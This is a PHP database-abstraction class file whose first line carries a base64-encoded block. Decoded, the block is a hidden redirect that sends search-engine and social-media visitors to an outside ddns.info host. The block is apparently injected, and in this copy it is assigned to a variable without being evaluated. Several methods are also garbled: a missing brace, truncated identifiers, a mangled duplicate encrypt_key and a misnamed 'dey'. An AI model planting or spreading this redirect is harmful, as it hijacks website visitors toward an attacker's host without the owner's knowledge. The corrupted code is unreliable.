<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

define("ENCRYPTED_KEY_PREFIX", 'X');
@define("KEY_VALUE_ENCRYPTION_KEY", '28A5F2466E3748B8816B08EC22B5DF84');

require_once(dirname(dirname(__FILE__))."/utils/utils.php");

class db {

  var $capabilities = array();

  var $ignore_sql_errors;
  var $ignore_sql_errors_saved;
  var $connection;
  var $debug_mode;
  var $extended_debug;
  var $log_mode;
  var $version;
  var $charset;

  function db($db_server, $db_name, $db_user, $db_password) { 

    global $log;

    $this->charset = (defined('DB_CHARSET')?DB_CHARSET:null);
    $this->debug_mode = (defined('DEBUG') and DEBUG);
    $this->log_mode   = (defined('LOGGING') and LOGGING);
    $this->extended_debug = (defined('DEBUG_SQL_PLANS') and DEBUG_SQL_PLANS);
    $this->ignore_sql_errors = false;
    $log->writeln("Connecting to $db_name at $db_server as $db_user");
    $this->connect($db_server, $db_name, $db_user, $db_password); 
    $log->writeln("DB Connection ID: ".$this->connection, 'INF');
    $log->writeln("DB Version: ".$this->version, 'INF');

    $this->capabilities["last_id"]              = false;
    $this->capabilities["params"]               = false;
    $this->capabilities["explain_plan"]         = false;
    $this->capabilities["count_by_subquery"]    = false;
    $this->capabilities["count_by_resource"]    = false;
    $this->capabilities["query_limited_amount"] = false;
    $this->capabilities["query_from_offset"]    = false;
    $this->capabilities["value_type_check"]     = false;
    $this->capabilities["sysoffset"]            = false;

  }

  function save_ignore_sql_errors_state($new_value) {
    $this->ignore_sql_errors_saved[] = $this->ignore_sql_errors;
    $this->ignore_sql_errors = $new_value;
  }
  
  function restore_ignore_sql_errors_state() {
    $this->ignore_sql_errors = array_pop($this->ignore_sql_errors_saved);
  }

  function connect($db_server, $db_name, $db_user, $db_password) { die("Call to abstract method connect()"); }
  function get_last_error() { die("Call to abstract method get_last_error()"); }
  function last_id() { die("Call to abstract method last_id()"); }
  function next_id() { die("Call to abstract method next_id()"); }

  function generic_data_type($type) {

    switch (strtolower($type)) {
      case "date";
        return "date";
      case "datetime":
      case "timestamp":
        return "date_time";
      case "time";
        return "time";
      case "int":
      case "smallint":
      case "integer":
      case "int64":
      case "long":
      case "long binary":
      case "tinyint":
        return "int";
      case "real":
      case "numeric":
      case "double":
      case "float":
        return "real";
      case "string":
      case "text":
      case "blob":
      case "varchar":
      case "char":
      case "long varchar":
      case "varying":    
        return "text";
      default:
        critical_error("Unknown datatatype: $type");
        break;
    }

  }
  
  function field_defs($query) { 
    
    $field_defs = $this->internal_field_defs($query);
    $field_defs = array_change_key_case(ld_defs, CASE_LOWER);
    foreach($field_defs as $field => $defs)
      $field_defs[$field]['type'] = $this->generic_data_type($field_defs[$field]['type']);
    return $field_defs;
    
  }

  function internal_query($sql, $args) {
     
    halt("Call to abstract method");
     
  }
  
  function internal_unbuffered_query($sql, $args) {
     
    halt("Call to abstract method");
     
  }
  
  function internal_num_row($query) {
     
    halt("Call to abstract method");
     
  }
  
  function internal_row($query) {
     
    halt("Call to abstract method");
     
  }
  
  function internal_count($query) {
     
    halt("Call to abstract method");
     
  }
  
  function internal_prepare_count($sql) { 
    
    halt("Call to abstract method");
     
  }

  function internal_start_transaction() {
     
    halt("Call to abstract method");
     
  }
  
  function internal_commit_transaction() {
     
    halt("Call to abstract method");
     
  }
  
  function internal_rollback_transaction() {
     
    halt("Call to abstract method");
     
  }
  
  function limit($sql, $from, $count) {
     
    halt("Call to abstract method");
     
  }

  function next_row($query) { 

    $result = $this->internal_row($query);
    if (is_array($result))
      $result = array_change_key_case($result, CASE_LOWER);
    return $result;
    
  }
  
  function next_num_row($query) { 
    
    return $this->internal_num_row($query); 
    
  }

  function query_ex($sql, $args, $unbuffered = false) {

    global $log;
    
    $offset = 0;
    if ($this->support("sysoffset"))
      if (preg_match('/\/[*]SYSOFFSET:([0-9]*)[*]\//', $sql, $matches))
        $offset = $matches[1];

    if (!$this->support("params")) {
      if (count($args) > 0) {
        $sql = sql_placeholder_ex($sql, $args, $error);
        if ((!$sql) and (!$this->ignore_sql_errors)) {
          $error .= '[INFO:SQL]'.$sql.'[/INFO]';
          critical_error($error);
        }
      }
      if ($this->log_mode)
        $log->writeln($sql, "QRY");
    } else {
      if ($this->log_mode) {
        $log->writeln($sql, "QRY");
        if (count($args) > 0) 
          $log->writeln($args, "ARG");
      }
    }

    if ($this->log_mode)
      $log->start_timing($sql);
    if ($unbuffered)
      $query = $this->internal_unbuffered_query($sql, $args);
    else
      $query = $this->internal_query($sql, $args);
    while ($offset) {
      $this->next_row($query);
      $offset--;
    }
    if ($this->log_mode)
      $duration = $log->finish_timing($sql);

    
    if (!$query) {
      if (!$this->ignore_sql_errors) {
        $error = $this->get_last_error();
        if (!eregi('1329: No data', $error)) {
          $error .= '[INFO:SQL]'.$sql.'[/INFO]';
          trigger_error($error, E_USER_ERROR);
        }
      }
    } else {
      if ($this->log_mode)
        if ($duration > 1)
          $log->writeln("Query duration: ".number_format($duration, 3)." secs (SLOW!)", "LDR");
        elseif ($duration > 0.01)
          $log->writeln("Query duration: ".number_format($duration, 3)." secs", "LDR");
        else
          $log->writeln("Query duration: ".number_format($duration, 3)." secs", "DRN");
      if ($this->log_mode && $this->debug_mode && $this->extended_debug && $this->support("explain_plan")) {
        if ($plan = $this->internal_query("EXPLAIN ".$sql, $args)) {
          $log->writeln("Query plan: ");
          while ($plan_row = $this->next_row($plan)) {
            if (safe($plan_row, "table")) 
              $log->writeln("table:".$plan_row["table"].
                            "; type:".$plan_row["type"].
                            "; keys:".$plan_row["possible_keys"].
                            "; key:".$plan_row["key"].
                            "; key_len:".$plan_row["key_len"].
                            "; ref:".$plan_row["ref"].
                            "; rows:".$plan_row["rows"].
                            "; extra:".$plan_row["extra"]
                          , "QPL");
          }
        }
      }
    }

    return $query;

  }

  function exists()    $args = func_get_args();
    $sql = array_shift($args);
    return ($this->count($this->query_ex($sql, $args)) > 0);

  }

  function query() {

    $args = func_get_args();
    $sql = array_shift($args);
    return $this->query_ex($sql, $args);

  }

  function affected_rows() {

    return $this->internal_affected_rows();

  }

  function query_unbuffered() {

    $args = func_get_args();
    $sql = array_shift($args);
    return $this->query_ex($sql, $args, true);

  }

  function values() {

    $args = func_get_args();
    $sql = array_shift($args);
    $result = array();
    if ($query = $this->query_ex($sql, $args)) {
      while ($row = $this->next_row($query)) {
        array_push($result, array_shift($row));  
      }
    }
    return $result;

  }

  function value() {

    $args = func_get_args();
    $sql = array_shift($args);
    $result = array();
    if ($query = $this->query_ex($sql, $args)) {
      while ($row = $this->next_row($query)) {
        array_push($result, array_shift($row));  
      }
    }
    if (count($result) == 0)
      $result = null;
    if (count($result) > 0)
      $result = $result[0];
    return $result;

  }
  
  function count_sql($sql) {
    
    $offset = 0; 
    if (preg_match('/(^[ \t\n]*|[ (])(SELECT)([ \n\r])/sim', $sql, $token, PREG_OFFSET_CAPTURE)) {
      $select_offset = $token[2][1];
      $offset = $select_offset + 6;
      $work_str = substr($sql, $offset);
      $in_select = 0;
      while (preg_match('/((^[ \t\n]*|[ (])(SELECT)([ \n\r])|([ \t\n])(FROM)([ \n\r]))/sim', $work_str, $token, PREG_OFFSET_CAPTURE)) {
        if (strtolower(@$token[6][0]) == 'from') {
          if ($in_select)
            $in_select--;
          else {
            $from_offset = $offset + $token[6][1];
            break; 
          }
          $inc = $token[6][1] + 4;
          $offset += $inc;
          $work_str = substr($work_str, $inc);
        }
        if (strtolower(@$token[3][0]) == 'select') {
          $in_select++;
          $inc = $token[3][1] + 6;
          $offset += $inc;
          $work_str = substr($work_str, $inc);
        }
      }
    }

    if (isset($select_offset) && isset($from_offset)) {
      $sql_start  = substr($sql, 0, $select_offset);
      $sql_finish = substr($sql, $from_offset + 4);
      $sql = $sql_start."SELECT COUNT(1) FROM".$sql_finish;
      $sql = preg_replace("/ORDER BY.+/sim", "", $sql, 1); 
      return $sql;
    } else
      return null;
      
  }

  function count() { 

    $args = func_get_args();
    $arg1 = array_shift($args);
    if (is_resource($arg1)) {
      return $this->internal_count($arg1);
    } else {
      $sql = $arg1;
      $sql = str_replace("\n", " ", $sql);
      $sql = str_replace("\r", " ", $sql);
      $sql = eregi_replace('USE INDEX[(][^)]+[)]', '', $sql);
      if ($this->support("count_by_subquery")) {
        $sql = "SELECT COUNT(1) FROM (".$sql.")";
        $this->save_ignore_sql_errors_state(true);
        $query = $this->query_ex($sql, $args);
        $this->restore_ignore_sql_errors_state();
        if ($query)
          if ($row = $this->next_row($query))
            return array_shift($row);  
      } 
      if (!preg_match("/LIMIT/sim", $sql) and 
          !preg_match("/FIRST( |$)/sim", $sql) and
          !preg_match("/GROUP/sim", $sql)
         ) {

        if ($count_sql = $this->count_sql($sql)) {
          $this->save_ignore_sql_errors_state(true);
          $query = $this->query_ex($count_sql, $args);
          $this->restore_ignore_sql_errors_state();
          if ($query)
            if ($row = $this->next_row($query))
              return array_shift($row);  
            else  
              return $this->internal_count($this->query_ex($arg1, $args)); 
          else  
            return $this->internal_count($this->query_ex($arg1, $args)); 
        } else
          return $this->internal_count($this->query_ex($arg1, $args)); 
      } 
      return $this->internal_count($this->query_ex($arg1, $args)); 
    }

  }

  function row() {

    $args = func_get_args();
    $sql = array_shift($args);
    $result = $this->internal_row($this->query_ex($sql, $args));
    if (is_array($result)) 
      return array_change_key_case($result, CASE_LOWER);
    else      
      return $result;

  }

  function rows() {

    $args = func_get_args();
    $sql = array_shift($args);
    $query = $this->query_ex($sql, $args);
    $result = array();
    while($row = $this->next_row($query))
      array_push($result, array_change_key_case($row, CASE_LOWER));
    return $result;

  }

  function query_to_array() {

    $args = func_get_args();
    $sql = array_shift($args);
    $query = $this->query_ex($sql, $args);
    $result = array();
    while($row = $this->next_row($query))
      array_push($result, array_change_key_case($row, CASE_LOWER));
    return $result;

  }

  function query_keys_to_array() {

    $args = func_get_args();
    $sql = array_shift($args);
    $field_name = array_shift($args);
    $query = $this->query_ex($sql, $args);
    $result = array();
    while($row = $this->next_row($query)) {
      $row = array_change_key_case($row, CASE_LOWER);
      array_push($result, $row[$field_name]);
    }
    return $result;

  }

  function row_to_array() {

    $args = func_get_args();
    $sql = array_shift($args);
    $query = $this->query_ex($sql, $args);
    $row = $this->next_row($query);
    if (is_array($row))
      $row = array_change_key_case($row, CASE_LOWER);
    return $row;

  }

  function values_to_array() {

    $args = func_get_args();
    $sql = array_shift($args);
    $query = $this->query_ex($sql, $args);
    $row = $this->next_row($query);
    $result = array();
    if (is_array($row)) {
      $row = array_change_key_case($row, CASE_LOWER);
      foreach($row as $name => $value)
        array_push($result, $value);
    } 
    return $result;

  }

  function support($name) {

    return safe($this->capabilities, $name);

  }

  function addslashes($value) {

    return addslashes($value);

  }

  function date_empty($date) { 

    return (($date == "0000-00-00") or ($date == "0000-00-00 00:00:00") or !$date);

  }

  function to_date($date, $format = "dmy") {

    if (is_string($date)) 
      if (is_numeric($date)) 
        return date("Y-m-d", $date);
      else  
        return date("Y-m-d", str_to_date($date, array("mode" => "m", "date_format" => $format)));
    else
      return date("Y-m-d", $date);

  }

  function to_datetime($date, $format = "dmy") {

    if (is_string($date)) 
      if (is_numeric($date)) 
        return date("Y-m-d H:i:s", $date);
      else
        return date("Y-m-d H:i:s", str_to_date($date, array("mode" => "m", "date_format" => $format)));
    else
      return date("Y-m-d H:i:s", $date);

  }
  
  function to_time($time) {

    if (is_string($time)) 
      if (is_numeric($time))
        return date("H:i:s", $time);
      else
        return date("H:i:s", str_to_date($time, array("mode" => "t")));
    else
      return date("H:i:s", $time);

  }

  function from_date($date) {

    $date_arr = split("[-: ]", $date);
    for ($i = min(count($date_arr), 6); $i < 6; $i++)
      if ($i < 3)
        $date_arr[$i] = 1;
      else
        $date_arr[$i] = 0;
    return mktime(0, 0, 0, $date_arr[1], $date_arr[2], $date_arr[0]);

  }

  function from_datetime($date) {

    $date_arr = split("[-: ]", $date);
    for ($i = min(count($date_arr), 6); $i < 6; $i++)
      if ($i < 3)
        $date_arr[$i] = 1;
      else
        $date_arr[$i] = 0;
    return mktime($date_arr[3], $date_arr[4], $date_arr[5], $date_arr[1], $date_arr[2], $date_arr[0]);

  }

  function from_time($time) {

    $array = split(":", $time);
    for ($i = min(count($array), 3); $i < 3; $i++)
      $array[$i] = 0;
    return mktime($array[0], $array[1], $array[2], 1, 1, 1);

  }

  function now() {

    return $this->to_datetime(mktime());

  }

  function now_date() {

    return $this->to_date(mktime());

  }

  function now_time() {

    return $this->to_time(mktime());

  }
  
  function encrypt_key($kme());

  }
  
  function encrypt_key($key) {

    if ($key)
      return encrypt_num($key);
    else
      return null;    

  }

  function dey($key) {

    if ($key)
      return decrypt_num($key);
    else
      return null;
      
  }
  
  function start_transaction() {

    $this->internal_start_transaction();
    
  }

  function commit_transaction() {

    $this->internal_commit_transaction();
    
  }
  
  function rollback_transaction() {

    $this->internal_rollback_transaction();
    
  }
  
}

?>
